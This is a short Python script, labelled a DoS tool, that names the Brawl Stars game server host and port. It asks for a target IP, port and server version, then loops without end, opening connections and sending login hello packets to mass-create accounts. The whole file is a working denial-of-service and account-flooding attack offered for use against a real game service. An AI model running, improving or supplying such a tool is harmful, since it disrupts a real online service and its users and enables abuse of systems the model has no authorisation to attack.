from login import login
from utils import Reader
import socket

#DoS Tool

ipbs = "game.brawlstarsgame.com" #Brawl Stars IP (Port: 9339)
ip = input("\033[0;37m[DDoS] Enter IP >> ")
port = input("\033[0;37m[DDoS] Enter port >> ")
version = int(input("\033[0;37m[DDoS] Enter version of the server >> "))
accounts = 0
while True:
   try:
      createacc = login().send_hello(version)
      s = socket.socket()
      s.connect((ip, int(port)))
      s.send(createacc)
      print(f"\033[32m[DDoS] Successful created {accounts} account!")
      accounts +=1
   except OSError:
      print("\033[31m[DDoS] Creating account error!")
      pass
